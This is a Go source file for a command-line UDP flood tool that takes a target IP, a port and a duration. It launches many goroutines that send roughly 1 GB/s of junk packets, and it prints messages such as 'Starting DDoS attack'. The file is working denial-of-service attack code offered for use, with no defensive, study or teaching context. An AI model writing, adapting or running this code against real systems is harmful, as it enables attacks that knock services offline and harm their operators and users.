package main

import (
	"fmt"
	"net"
	"os"
	"strconv"
	"sync"
	"time"
)

func countdown(duration int) {
	fmt.Println("Attack duration:")
	for remaining := duration; remaining > 0; remaining-- {
		if remaining == 0 {
			fmt.Println()
			break
		}
		fmt.Printf("\r%2d seconds remaining", remaining)
		time.Sleep(time.Second)
	}
	fmt.Println()
	fmt.Println() // Print an empty line
}

// Define the expiry date as a global variable
var expiryDate = time.Date(2024, 06, 12, 0, 0, 0, 0, time.UTC)

func main() {

	if len(os.Args) != 4 {
		fmt.Println("Usage: ./mrin <target_ip> <target_port> <attack_duration>")
		fmt.Println() // Print an empty line
		return
	}

	targetIP := os.Args[1]
	targetPort := os.Args[2]
	duration, err := strconv.Atoi(os.Args[3])
	if err != nil {
		fmt.Println("Invalid attack duration:", err)
		return
	}

	// Calculate the number of packets needed to achieve 1GB/s traffic
	packetSize := 1400 // Adjust packet size as needed
	packetsPerSecond := 1_000_000_000 / packetSize
	numThreads := packetsPerSecond / 25_000

	// Create wait group to ensure all goroutines finish before exiting
	var wg sync.WaitGroup

	// Create a deadline time for when the attack should stop
	deadline := time.Now().Add(time.Duration(duration) * time.Second)

	// Display attack start message
	fmt.Printf("Starting DDoS attack on  %s : %s  for  %d seconds.\n", targetIP, targetPort, duration)
	fmt.Println() // Print an empty line

	// Launch goroutines for each thread
	for i := 0; i < numThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			sendUDPPackets(targetIP, targetPort, packetsPerSecond/numThreads, deadline)
		}()
	}

	// Start countdown
	go countdown(duration)

	// Wait for all goroutines to finish
	wg.Wait()

	fmt.Println() // Print an empty line
	fmt.Println("Attack finished successfully.")
	fmt.Println() // Print an empty line
}

func sendUDPPackets(ip, port string, packetsPerSecond int, deadline time.Time) {
	message := make([]byte, 1420)
	for i := range message {
		message[i] = byte(i % 256)
	}

	for time.Now().Before(deadline) {
		conn, err := net.Dial("udp", fmt.Sprintf("%s:%s", ip, port))
		if err != nil {
			fmt.Println("Error connecting:", err)
			time.Sleep(100 * time.Millisecond) // Retry after a short delay
			continue
		}

		// Generate and send UDP packets continuously until the deadline
		ticker := time.NewTicker(time.Second / time.Duration(packetsPerSecond))
		defer ticker.Stop()

		for time.Now().Before(deadline) {
			select {
			case <-ticker.C:
				_, err := conn.Write(message)
				if err != nil {
					fmt.Println("Error sending UDP packet:", err)
					conn.Close()
					time.Sleep(100 * time.Millisecond) // Retry after a short delay
					break
				}
			}
		}
		conn.Close()
	}
}
